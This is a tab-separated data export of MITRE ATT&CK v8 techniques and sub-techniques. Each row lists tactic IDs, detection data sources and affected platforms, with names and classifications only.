T1123	Audio Capture	\N	\N	T1123	TA0009	\N	{"API monitoring","Process monitoring","File monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1119	Automated Collection	\N	\N	T1119	TA0009	\N	{"File monitoring","Data loss prevention","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1197	BITS Jobs	\N	\N	T1197	TA0005,TA0003	\N	{"Process monitoring","Process command-line parameters","Packet capture","Windows event logs"}	'Windows'	ATT&CK v8
T1547	Boot or Logon Autostart Execution	\N	\N	T1547	TA0003,TA0004	\N	\N	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1547	Boot or Logon Autostart Execution	T1547.005	Security Support Provider	T1547.005	TA0003,TA0004	\N	{"DLL monitoring","Windows Registry","Loaded DLLs"}	'Windows'	ATT&CK v8
T1547	Boot or Logon Autostart Execution	T1547.006	Kernel Modules and Extensions	T1547.006	TA0003,TA0004	\N	{"Process monitoring","Process command-line parameters"}	'macOS', 'Linux'	ATT&CK v8
T1547	Boot or Logon Autostart Execution	T1547.007	Re-opened Applications	T1547.007	TA0003,TA0004	\N	{"File monitoring"}	'macOS'	ATT&CK v8
T1547	Boot or Logon Autostart Execution	T1547.009	Shortcut Modification	T1547.009	TA0003,TA0004	\N	{"File monitoring","Process monitoring","Process command-line parameters"}	'Windows'	ATT&CK v8
T1547	Boot or Logon Autostart Execution	T1547.011	Plist Modification	T1547.011	TA0003,TA0004	\N	{"File monitoring","Process monitoring","Process command-line parameters"}	'macOS'	ATT&CK v8
T1037	Boot or Logon Initialization Scripts	\N	\N	T1037	TA0003,TA0004	\N	{"File monitoring","Process monitoring"}	'macOS', 'Windows', 'Linux'	ATT&CK v8
T1037	Boot or Logon Initialization Scripts	T1037.001	Logon Script (Windows)	T1037.001	TA0003,TA0004	\N	{"Process monitoring","Windows Registry"}	'Windows'	ATT&CK v8
T1037	Boot or Logon Initialization Scripts	T1037.005	Startup Items	T1037.005	TA0003,TA0004	\N	{"File monitoring","Process monitoring"}	'macOS'	ATT&CK v8
T1217	Browser Bookmark Discovery	\N	\N	T1217	TA0007	\N	{"API monitoring","File monitoring","Process command-line parameters","Process monitoring"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1110	Brute Force	\N	\N	T1110	TA0006	\N	{"Office 365 account logs","Authentication logs"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace', 'Containers'	ATT&CK v8
T1110	Brute Force	T1110.004	Credential Stuffing	T1110.004	TA0006	\N	{"Authentication logs","Office 365 account logs"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace', 'Containers'	ATT&CK v8
T1115	Clipboard Data	\N	\N	T1115	TA0009	\N	{"API monitoring"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1059	Command and Scripting Interpreter	T1059.002	AppleScript	T1059.002	TA0002	\N	{"API monitoring","Process monitoring","Process command-line parameters"}	'macOS'	ATT&CK v8
T1586	Compromise Accounts	T1586.001	Social Media Accounts	T1586.001	TA0042	\N	{"Social media monitoring"}	'PRE'	ATT&CK v8
T1586	Compromise Accounts	T1586.002	Email Accounts	T1586.002	TA0042	\N	\N	'PRE'	ATT&CK v8
T1554	Compromise Client Software Binary	\N	\N	T1554	TA0003	\N	{"Process monitoring","Binary file metadata"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1584	Compromise Infrastructure	\N	\N	T1584	TA0042	\N	\N	'PRE'	ATT&CK v8
T1584	Compromise Infrastructure	T1584.002	DNS Server	T1584.002	TA0042	\N	\N	'PRE'	ATT&CK v8
T1584	Compromise Infrastructure	T1584.003	Virtual Private Server	T1584.003	TA0042	\N	\N	'PRE'	ATT&CK v8
T1584	Compromise Infrastructure	T1584.004	Server	T1584.004	TA0042	\N	\N	'PRE'	ATT&CK v8
T1584	Compromise Infrastructure	T1584.005	Botnet	T1584.005	TA0042	\N	\N	'PRE'	ATT&CK v8
T1584	Compromise Infrastructure	T1584.006	Web Services	T1584.006	TA0042	\N	\N	'PRE'	ATT&CK v8
T1586	Compromise Accounts	\N	\N	T1586	TA0042	\N	{"Social media monitoring"}	'PRE'	ATT&CK v8
T1136	Create Account	T1136.001	Local Account	T1136.001	TA0003	\N	{"Process monitoring","Process command-line parameters","Authentication logs","Windows event logs"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1555	Credentials from Password Stores	T1555.002	Securityd Memory	T1555.002	TA0006	\N	{"Process monitoring"}	'Linux', 'macOS'	ATT&CK v8
T1555	Credentials from Password Stores	T1555.003	Credentials from Web Browsers	T1555.003	TA0006	\N	{"File monitoring","API monitoring","PowerShell logs","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1132	Data Encoding	\N	\N	T1132	TA0011	\N	{"Packet capture","Process use of network","Process monitoring","Network protocol analysis"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1486	Data Encrypted for Impact	\N	\N	T1486	TA0040	\N	{"Kernel drivers","File monitoring","Process command-line parameters","Process monitoring"}	'Linux', 'macOS', 'Windows', 'IaaS'	ATT&CK v8
T1565	Data Manipulation	\N	\N	T1565	TA0040	\N	{"Packet capture","Network protocol analysis","File monitoring","Application logs"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1565	Data Manipulation	T1565.003	Runtime Data Manipulation	T1565.003	TA0040	\N	{"Process monitoring","File monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1001	Data Obfuscation	T1001.002	Steganography	T1001.002	TA0011	\N	{"Packet capture","Process use of network","Process monitoring","Network protocol analysis"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1074	Data Staged	\N	\N	T1074	TA0009	\N	{"File monitoring","Process monitoring","Process command-line parameters"}	'Windows', 'IaaS', 'Linux', 'macOS'	ATT&CK v8
T1030	Data Transfer Size Limits	\N	\N	T1030	TA0010	\N	{"Packet capture","Netflow/Enclave netflow","Process use of network","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1602	Data from Configuration Repository	\N	\N	T1602	TA0009	\N	{"Netflow/Enclave netflow","Network protocol analysis","Packet capture"}	'Network'	ATT&CK v8
T1213	Data from Information Repositories	\N	\N	T1213	TA0009	\N	{"OAuth audit logs","Application logs","Authentication logs","Data loss prevention","Third-party application logs"}	'Linux', 'Windows', 'macOS', 'SaaS', 'Office 365', 'Google Workspace'	ATT&CK v8
T1039	Data from Network Shared Drive	\N	\N	T1039	TA0009	\N	{"File monitoring","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1491	Defacement	\N	\N	T1491	TA0040	\N	{"Packet capture","Web application firewall logs","Web logs","Packet capture"}	'Windows', 'IaaS', 'Linux', 'macOS'	ATT&CK v8
T1491	Defacement	T1491.002	External Defacement	T1491.002	TA0040	\N	{"Web logs","Web application firewall logs","Packet capture"}	'Windows', 'IaaS', 'Linux', 'macOS'	ATT&CK v8
T1587	Develop Capabilities	\N	\N	T1587	TA0042	\N	\N	'PRE'	ATT&CK v8
T1587	Develop Capabilities	T1587.001	Malware	T1587.001	TA0042	\N	\N	'PRE'	ATT&CK v8
T1587	Develop Capabilities	T1587.002	Code Signing Certificates	T1587.002	TA0042	\N	\N	'PRE'	ATT&CK v8
T1587	Develop Capabilities	T1587.003	Digital Certificates	T1587.003	TA0042	\N	{"SSL/TLS certificates"}	'PRE'	ATT&CK v8
T1587	Develop Capabilities	T1587.004	Exploits	T1587.004	TA0042	\N	\N	'PRE'	ATT&CK v8
T1006	Direct Volume Access	\N	\N	T1006	TA0005	\N	{"API monitoring"}	'Windows'	ATT&CK v8
T1568	Dynamic Resolution	\N	\N	T1568	TA0011	\N	{"SSL/TLS inspection","Web logs","DNS records"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1568	Dynamic Resolution	T1568.001	Fast Flux DNS	T1568.001	TA0011	\N	{"DNS records"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1568	Dynamic Resolution	T1568.003	DNS Calculation	T1568.003	TA0011	\N	{"DNS records"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1114	Email Collection	T1114.002	Remote Email Collection	T1114.002	TA0009	\N	{"Authentication logs","Email gateway","Mail server","Office 365 trace logs"}	'Office 365', 'Windows', 'Google Workspace'	ATT&CK v8
T1573	Encrypted Channel	\N	\N	T1573	TA0011	\N	{"SSL/TLS inspection","Process monitoring","Process use of network","Malware reverse engineering","Netflow/Enclave netflow","Packet capture"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1499	Endpoint Denial of Service	T1499.004	Application or System Exploitation	T1499.004	TA0040	\N	{"Network device logs","Network intrusion detection system","Web application firewall logs","Web logs","SSL/TLS inspection"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace'	ATT&CK v8
T1585	Establish Accounts	\N	\N	T1585	TA0042	\N	{"Social media monitoring"}	'PRE'	ATT&CK v8
T1585	Establish Accounts	T1585.002	Email Accounts	T1585.002	TA0042	\N	\N	'PRE'	ATT&CK v8
T1546	Event Triggered Execution	T1546.001	Change Default File Association	T1546.001	TA0003,TA0004	\N	{"Process command-line parameters","Process monitoring","Windows Registry"}	'Windows'	ATT&CK v8
T1546	Event Triggered Execution	T1546.003	Windows Management Instrumentation Event Subscription	T1546.003	TA0003,TA0004	\N	{"Process command-line parameters","Process monitoring","WMI Objects"}	'Windows'	ATT&CK v8
T1546	Event Triggered Execution	T1546.013	PowerShell Profile	T1546.013	TA0003,TA0004	\N	{"PowerShell logs","File monitoring","Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1546	Event Triggered Execution	T1546.014	Emond	T1546.014	TA0003,TA0004	\N	{"File monitoring"}	'macOS'	ATT&CK v8
T1546	Event Triggered Execution	T1546.015	Component Object Model Hijacking	T1546.015	TA0003,TA0004	\N	{"Process command-line parameters","Process monitoring","Loaded DLLs","DLL monitoring","Windows Registry"}	'Windows'	ATT&CK v8
T1480	Execution Guardrails	\N	\N	T1480	TA0005	\N	{"Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1041	Exfiltration Over C2 Channel	\N	\N	T1041	TA0010	\N	{"Packet capture","Process use of network","Netflow/Enclave netflow","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1011	Exfiltration Over Other Network Medium	T1011.001	Exfiltration Over Bluetooth	T1011.001	TA0010	\N	{"Process monitoring","User interface"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1052	Exfiltration Over Physical Medium	\N	\N	T1052	TA0010	\N	{"Process monitoring","Data loss prevention","File monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1567	Exfiltration Over Web Service	T1567.001	Exfiltration to Code Repository	T1567.001	TA0010	\N	{"Process monitoring","Process use of network","Packet capture","Netflow/Enclave netflow","Network protocol analysis","SSL/TLS inspection"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1546	Event Triggered Execution	T1546.010	AppInit DLLs	T1546.010	TA0003,TA0004	\N	{"Windows Registry","Process command-line parameters","Process monitoring","Loaded DLLs"}	'Windows'	ATT&CK v8
T1212	Exploitation for Credential Access	\N	\N	T1212	TA0006	\N	{"Authentication logs","Windows Error Reporting","Process monitoring"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1036	Masquerading	T1036.006	Space after Filename	T1036.006	TA0005	\N	{"File monitoring","Process monitoring"}	'Linux', 'macOS'	ATT&CK v8
T1068	Exploitation for Privilege Escalation	\N	\N	T1068	TA0004	\N	{"Windows Error Reporting","Process monitoring","Application logs"}	'Linux', 'macOS', 'Windows', 'Containers'	ATT&CK v8
T1133	External Remote Services	\N	\N	T1133	TA0001,TA0003	\N	{"Authentication logs"}	'Windows', 'Linux', 'Containers'	ATT&CK v8
T1008	Fallback Channels	\N	\N	T1008	TA0011	\N	{"Malware reverse engineering","Netflow/Enclave netflow","Packet capture","Process monitoring","Process use of network"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1222	File and Directory Permissions Modification	T1222.002	Linux and Mac File and Directory Permissions Modification	T1222.002	TA0005	\N	{"Process command-line parameters","Process monitoring","File monitoring"}	'macOS', 'Linux'	ATT&CK v8
T1495	Firmware Corruption	\N	\N	T1495	TA0040	\N	{BIOS,"Component firmware"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1187	Forced Authentication	\N	\N	T1187	TA0006	\N	{"File monitoring","Network protocol analysis","Network device logs","Process use of network"}	'Windows'	ATT&CK v8
T1592	Gather Victim Host Information	T1592.001	Hardware	T1592.001	TA0043	\N	\N	'PRE'	ATT&CK v8
T1592	Gather Victim Host Information	T1592.002	Software	T1592.002	TA0043	\N	\N	'PRE'	ATT&CK v8
T1592	Gather Victim Host Information	T1592.003	Firmware	T1592.003	TA0043	\N	\N	'PRE'	ATT&CK v8
T1592	Gather Victim Host Information	T1592.004	Client Configurations	T1592.004	TA0043	\N	\N	'PRE'	ATT&CK v8
T1589	Gather Victim Identity Information	\N	\N	T1589	TA0043	\N	\N	'PRE'	ATT&CK v8
T1589	Gather Victim Identity Information	T1589.001	Credentials	T1589.001	TA0043	\N	\N	'PRE'	ATT&CK v8
T1589	Gather Victim Identity Information	T1589.002	Email Addresses	T1589.002	TA0043	\N	\N	'PRE'	ATT&CK v8
T1590	Gather Victim Network Information	\N	\N	T1590	TA0043	\N	\N	'PRE'	ATT&CK v8
T1590	Gather Victim Network Information	T1590.001	Domain Properties	T1590.001	TA0043	\N	\N	'PRE'	ATT&CK v8
T1590	Gather Victim Network Information	T1590.002	DNS	T1590.002	TA0043	\N	\N	'PRE'	ATT&CK v8
T1590	Gather Victim Network Information	T1590.003	Network Trust Dependencies	T1590.003	TA0043	\N	\N	'PRE'	ATT&CK v8
T1590	Gather Victim Network Information	T1590.004	Network Topology	T1590.004	TA0043	\N	\N	'PRE'	ATT&CK v8
T1590	Gather Victim Network Information	T1590.005	IP Addresses	T1590.005	TA0043	\N	\N	'PRE'	ATT&CK v8
T1591	Gather Victim Org Information	\N	\N	T1591	TA0043	\N	\N	'PRE'	ATT&CK v8
T1591	Gather Victim Org Information	T1591.002	Business Relationships	T1591.002	TA0043	\N	\N	'PRE'	ATT&CK v8
T1591	Gather Victim Org Information	T1591.003	Identify Business Tempo	T1591.003	TA0043	\N	\N	'PRE'	ATT&CK v8
T1591	Gather Victim Org Information	T1591.004	Identify Roles	T1591.004	TA0043	\N	\N	'PRE'	ATT&CK v8
T1564	Hide Artifacts	T1564.002	Hidden Users	T1564.002	TA0005	\N	{"File monitoring","Authentication logs"}	'macOS'	ATT&CK v8
T1564	Hide Artifacts	T1564.007	VBA Stomping	T1564.007	TA0005	\N	{"Process monitoring","File monitoring"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1574	Hijack Execution Flow	\N	\N	T1574	TA0005,TA0003,TA0004	\N	{"Environment variable","Loaded DLLs","Process command-line parameters","Process monitoring","File monitoring","DLL monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1574	Hijack Execution Flow	T1574.002	DLL Side-Loading	T1574.002	TA0005,TA0003,TA0004	\N	{"Loaded DLLs","Process monitoring","Process use of network"}	'Windows'	ATT&CK v8
T1574	Hijack Execution Flow	T1574.004	Dylib Hijacking	T1574.004	TA0005,TA0003,TA0004	\N	{"Process monitoring","File monitoring"}	'macOS'	ATT&CK v8
T1574	Hijack Execution Flow	T1574.009	Path Interception by Unquoted Path	T1574.009	TA0005,TA0003,TA0004	\N	{"Process monitoring","File monitoring"}	'Windows'	ATT&CK v8
T1574	Hijack Execution Flow	T1574.010	Services File Permissions Weakness	T1574.010	TA0005,TA0003,TA0004	\N	{"Process command-line parameters",Services,"File monitoring"}	'Windows'	ATT&CK v8
T1562	Impair Defenses	T1562.006	Indicator Blocking	T1562.006	TA0005	\N	{"Process command-line parameters","Process monitoring","Sensor health and status"}	'Windows', 'macOS', 'Linux'	ATT&CK v8
T1562	Impair Defenses	T1562.008	Disable Cloud Logs	T1562.008	TA0005	\N	{"AWS CloudTrail logs","Azure activity logs","GCP audit logs"}	'IaaS'	ATT&CK v8
T1070	Indicator Removal on Host	T1070.005	Network Share Connection Removal	T1070.005	TA0005	\N	{"Authentication logs","Packet capture","Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1202	Indirect Command Execution	\N	\N	T1202	TA0005	\N	{"File monitoring","Process monitoring","Process command-line parameters","Windows event logs"}	'Windows'	ATT&CK v8
T1525	Implant Internal Image	\N	\N	T1525	TA0003	\N	{"File monitoring","Asset management"}	'IaaS', 'Containers'	ATT&CK v8
T1490	Inhibit System Recovery	\N	\N	T1490	TA0040	\N	{"Windows Registry",Services,"Windows event logs","Process command-line parameters","Process monitoring"}	'Windows', 'macOS', 'Linux'	ATT&CK v8
T1056	Input Capture	T1056.001	Keylogging	T1056.001	TA0009,TA0006	\N	{"Windows Registry","Process monitoring","API monitoring"}	'Windows', 'macOS', 'Linux', 'Network'	ATT&CK v8
T1056	Input Capture	T1056.003	Web Portal Capture	T1056.003	TA0009,TA0006	\N	{"File monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1559	Inter-Process Communication	\N	\N	T1559	TA0002	\N	{"Process monitoring","DLL monitoring","File monitoring"}	'Windows'	ATT&CK v8
T1559	Inter-Process Communication	T1559.001	Component Object Model	T1559.001	TA0002	\N	{"Process monitoring","DLL monitoring"}	'Windows'	ATT&CK v8
T1559	Inter-Process Communication	T1559.002	Dynamic Data Exchange	T1559.002	TA0002	\N	{"Process monitoring","DLL monitoring","File monitoring"}	'Windows'	ATT&CK v8
T1149	LC_MAIN Hijacking	\N	\N	T1149	TA0005	\N	{"Binary file metadata","Malware reverse engineering","Process monitoring"}	'macOS'	ATT&CK v8
T1185	Man in the Browser	\N	\N	T1185	TA0009	\N	{"Authentication logs","Packet capture","Process monitoring","API monitoring"}	'Windows'	ATT&CK v8
T1036	Masquerading	\N	\N	T1036	TA0005	\N	{"Process command-line parameters","File monitoring","Process monitoring","Binary file metadata"}	'Linux', 'macOS', 'Windows', 'Containers'	ATT&CK v8
T1036	Masquerading	T1036.002	Right-to-Left Override	T1036.002	TA0005	\N	{"File monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1036	Masquerading	T1036.004	Masquerade Task or Service	T1036.004	TA0005	\N	{"Windows Registry","Process monitoring","Process command-line parameters","Windows event logs"}	'Windows', 'Linux'	ATT&CK v8
T1556	Modify Authentication Process	T1556.002	Password Filter DLL	T1556.002	TA0006,TA0005,TA0003	\N	{"File monitoring","DLL monitoring"}	'Windows'	ATT&CK v8
T1556	Modify Authentication Process	T1556.003	Pluggable Authentication Modules	T1556.003	TA0006,TA0005,TA0003	\N	{"Authentication logs","File monitoring"}	'Linux', 'macOS'	ATT&CK v8
T1578	Modify Cloud Compute Infrastructure	\N	\N	T1578	TA0005	\N	{"Stackdriver logs","GCP audit logs","Azure activity logs","AWS CloudTrail logs"}	'IaaS'	ATT&CK v8
T1578	Modify Cloud Compute Infrastructure	T1578.004	Revert Cloud Instance	T1578.004	TA0005	\N	{"Stackdriver logs","GCP audit logs","Azure activity logs","AWS CloudTrail logs"}	'IaaS'	ATT&CK v8
T1112	Modify Registry	\N	\N	T1112	TA0005	\N	{"Windows Registry","File monitoring","Process monitoring","Process command-line parameters","Windows event logs"}	'Windows'	ATT&CK v8
T1601	Modify System Image	T1601.002	Downgrade System Image	T1601.002	TA0005	\N	{"Network device configuration","File monitoring"}	'Network'	ATT&CK v8
T1104	Multi-Stage Channels	\N	\N	T1104	TA0011	\N	{"Netflow/Enclave netflow","Network device logs","Network protocol analysis","Packet capture","Process use of network"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1106	Native API	\N	\N	T1106	TA0002	\N	{"System calls","Loaded DLLs","API monitoring","Process monitoring"}	'Windows', 'macOS', 'Linux'	ATT&CK v8
T1135	Network Share Discovery	\N	\N	T1135	TA0007	\N	{"Process monitoring","Process command-line parameters","Network protocol analysis","Process use of network"}	'macOS', 'Windows', 'Linux'	ATT&CK v8
T1003	OS Credential Dumping	\N	\N	T1003	TA0006	\N	{"API monitoring","Process monitoring","PowerShell logs","Process command-line parameters"}	'Windows', 'Linux', 'macOS'	ATT&CK v8
T1003	OS Credential Dumping	T1003.003	NTDS	T1003.003	TA0006	\N	{"Windows event logs","Process command-line parameters","PowerShell logs","Process monitoring"}	'Windows'	ATT&CK v8
T1003	OS Credential Dumping	T1003.004	LSA Secrets	T1003.004	TA0006	\N	{"Process monitoring","PowerShell logs","Process command-line parameters"}	'Windows'	ATT&CK v8
T1003	OS Credential Dumping	T1003.007	Proc Filesystem	T1003.007	TA0006	\N	{"Process monitoring"}	'Linux'	ATT&CK v8
T1003	OS Credential Dumping	T1003.008	/etc/passwd and /etc/shadow	T1003.008	TA0006	\N	\N	'Linux'	ATT&CK v8
T1027	Obfuscated Files or Information	T1027.001	Binary Padding	T1027.001	TA0005	\N	{"Process monitoring","Binary file metadata","File monitoring","Malware reverse engineering"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1027	Obfuscated Files or Information	T1027.003	Steganography	T1027.003	TA0005	\N	{"Binary file metadata"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1027	Obfuscated Files or Information	T1027.004	Compile After Delivery	T1027.004	TA0005	\N	{"File monitoring","Process command-line parameters","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1588	Obtain Capabilities	T1588.001	Malware	T1588.001	TA0042	\N	\N	'PRE'	ATT&CK v8
T1588	Obtain Capabilities	T1588.002	Tool	T1588.002	TA0042	\N	\N	'PRE'	ATT&CK v8
T1588	Obtain Capabilities	T1588.003	Code Signing Certificates	T1588.003	TA0042	\N	\N	'PRE'	ATT&CK v8
T1137	Office Application Startup	T1137.004	Outlook Home Page	T1137.004	TA0003	\N	{"Mail server","Process monitoring","Process command-line parameters"}	'Windows', 'Office 365'	ATT&CK v8
T1201	Password Policy Discovery	\N	\N	T1201	TA0007	\N	{"Process command-line parameters","Process monitoring"}	'Windows', 'Linux', 'macOS'	ATT&CK v8
T1069	Permission Groups Discovery	T1069.001	Local Groups	T1069.001	TA0007	\N	{"API monitoring","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1069	Permission Groups Discovery	T1069.002	Domain Groups	T1069.002	TA0007	\N	{"API monitoring","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1566	Phishing	T1566.003	Spearphishing via Service	T1566.003	TA0001	\N	{"SSL/TLS inspection",Anti-virus,"Web proxy"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1598	Phishing for Information	\N	\N	T1598	TA0043	\N	{"Social media monitoring","Mail server","Email gateway"}	'PRE'	ATT&CK v8
T1598	Phishing for Information	T1598.001	Spearphishing Service	T1598.001	TA0043	\N	\N	'PRE'	ATT&CK v8
T1598	Phishing for Information	T1598.003	Spearphishing Link	T1598.003	TA0043	\N	{"Mail server","Email gateway"}	'PRE'	ATT&CK v8
T1542	Pre-OS Boot	\N	\N	T1542	TA0005,TA0003	\N	{VBR,MBR,"Component firmware","Process monitoring","Disk forensics",EFI,BIOS,"API monitoring"}	'Linux', 'Windows', 'Network'	ATT&CK v8
T1542	Pre-OS Boot	T1542.002	Component Firmware	T1542.002	TA0005,TA0003	\N	{"Component firmware","Process monitoring","Disk forensics","API monitoring"}	'Windows'	ATT&CK v8
T1542	Pre-OS Boot	T1542.003	Bootkit	T1542.003	TA0005,TA0003	\N	{VBR,MBR,"API monitoring"}	'Linux', 'Windows'	ATT&CK v8
T1057	Process Discovery	\N	\N	T1057	TA0007	\N	{"API monitoring","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1055	Process Injection	\N	\N	T1055	TA0005,TA0004	\N	{"API monitoring","File monitoring","DLL monitoring","Process monitoring","Named Pipes"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1055	Process Injection	T1055.002	Portable Executable Injection	T1055.002	TA0005,TA0004	\N	{"Process monitoring","API monitoring"}	'Windows'	ATT&CK v8
T1055	Process Injection	T1055.008	Ptrace System Calls	T1055.008	TA0005,TA0004	\N	{"System calls","Process monitoring"}	'Linux'	ATT&CK v8
T1055	Process Injection	T1055.011	Extra Window Memory Injection	T1055.011	TA0005,TA0004	\N	{"Process monitoring","API monitoring"}	'Windows'	ATT&CK v8
T1055	Process Injection	T1055.012	Process Hollowing	T1055.012	TA0005,TA0004	\N	{"Process monitoring","API monitoring"}	'Windows'	ATT&CK v8
T1055	Process Injection	T1055.014	VDSO Hijacking	T1055.014	TA0005,TA0004	\N	{"System calls","Process monitoring"}	'Linux'	ATT&CK v8
T1553	Subvert Trust Controls	T1553.001	Gatekeeper Bypass	T1553.001	TA0005	\N	{"File monitoring","Process command-line parameters"}	'macOS'	ATT&CK v8
T1134	Access Token Manipulation	T1134.005	SID-History Injection	T1134.005	TA0005,TA0004	\N	{"Windows event logs","Authentication logs","API monitoring"}	'Windows'	ATT&CK v8
T1087	Account Discovery	T1087.002	Domain Account	T1087.002	TA0007	\N	{"API monitoring","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1087	Account Discovery	T1087.004	Cloud Account	T1087.004	TA0007	\N	{"Stackdriver logs","AWS CloudTrail logs","Azure activity logs","Office 365 account logs","Process monitoring","Process command-line parameters"}	'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Google Workspace'	ATT&CK v8
T1098	Account Manipulation	T1098.002	Exchange Email Delegate Permissions	T1098.002	TA0003	\N	{"Office 365 audit logs"}	'Windows', 'Office 365'	ATT&CK v8
T1583	Acquire Infrastructure	T1583.003	Virtual Private Server	T1583.003	TA0042	\N	\N	'PRE'	ATT&CK v8
T1595	Active Scanning	T1595.002	Vulnerability Scanning	T1595.002	TA0043	\N	{"Packet capture","Network device logs"}	'PRE'	ATT&CK v8
T1602	Data from Configuration Repository	T1602.001	SNMP (MIB Dump)	T1602.001	TA0009		{"Netflow/Enclave netflow","Network protocol analysis","Packet capture"}	'Network'	ATT&CK v8
T1588	Obtain Capabilities	T1588.005	Exploits	T1588.005	TA0042	\N	\N	'PRE'	ATT&CK v8
T1588	Obtain Capabilities	T1588.006	Vulnerabilities	T1588.006	TA0042	\N	\N	'PRE'	ATT&CK v8
T1090	Proxy	T1090.004	Domain Fronting	T1090.004	TA0011	\N	{"SSL/TLS inspection","Packet capture"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1219	Remote Access Software	\N	\N	T1219	TA0011	\N	{"Network intrusion detection system","Network protocol analysis","Process use of network","Process monitoring"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1563	Remote Service Session Hijacking	T1563.001	SSH Hijacking	T1563.001	TA0008	\N	{"Authentication logs"}	'Linux', 'macOS'	ATT&CK v8
T1563	Remote Service Session Hijacking	T1563.002	RDP Hijacking	T1563.002	TA0008	\N	{"Process monitoring","Netflow/Enclave netflow","Authentication logs"}	'Windows'	ATT&CK v8
T1021	Remote Services	T1021.001	Remote Desktop Protocol	T1021.001	TA0008	\N	{"Process monitoring","Netflow/Enclave netflow","Authentication logs"}	'Windows'	ATT&CK v8
T1021	Remote Services	T1021.005	VNC	T1021.005	TA0008	\N	{"Process use of network","Network protocol analysis","Netflow/Enclave netflow"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1014	Rootkit	\N	\N	T1014	TA0005	\N	{BIOS,MBR,"System calls"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1053	Scheduled Task/Job	T1053.001	At (Linux)	T1053.001	TA0002,TA0003,TA0004	\N	{"Process command-line parameters","Process monitoring"}	'Linux'	ATT&CK v8
T1053	Scheduled Task/Job	T1053.003	Cron	T1053.003	TA0002,TA0003,TA0004	\N	{"Process command-line parameters","Process monitoring"}	'Linux', 'macOS'	ATT&CK v8
T1053	Scheduled Task/Job	T1053.005	Scheduled Task	T1053.005	TA0002,TA0003,TA0004	\N	{"File monitoring","Process command-line parameters","Process monitoring","Windows event logs"}	'Windows'	ATT&CK v8
T1029	Scheduled Transfer	\N	\N	T1029	TA0010	\N	{"Netflow/Enclave netflow","Process use of network","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1113	Screen Capture	\N	\N	T1113	TA0009	\N	{"API monitoring","Process monitoring","File monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1597	Search Closed Sources	T1597.002	Purchase Technical Data	T1597.002	TA0043	\N	\N	'PRE'	ATT&CK v8
T1596	Search Open Technical Databases	\N	\N	T1596	TA0043	\N	\N	'PRE'	ATT&CK v8
T1596	Search Open Technical Databases	T1596.001	DNS/Passive DNS	T1596.001	TA0043	\N	\N	'PRE'	ATT&CK v8
T1596	Search Open Technical Databases	T1596.002	WHOIS	T1596.002	TA0043	\N	\N	'PRE'	ATT&CK v8
T1596	Search Open Technical Databases	T1596.003	Digital Certificates	T1596.003	TA0043	\N	\N	'PRE'	ATT&CK v8
T1596	Search Open Technical Databases	T1596.004	CDNs	T1596.004	TA0043	\N	\N	'PRE'	ATT&CK v8
T1593	Search Open Websites/Domains	\N	\N	T1593	TA0043	\N	\N	'PRE'	ATT&CK v8
T1593	Search Open Websites/Domains	T1593.002	Search Engines	T1593.002	TA0043	\N	\N	'PRE'	ATT&CK v8
T1594	Search Victim-Owned Websites	\N	\N	T1594	TA0043	\N	{"Web logs"}	'PRE'	ATT&CK v8
T1505	Server Software Component	T1505.002	Transport Agent	T1505.002	TA0003	\N	{"Application logs","File monitoring"}	'Linux', 'Windows'	ATT&CK v8
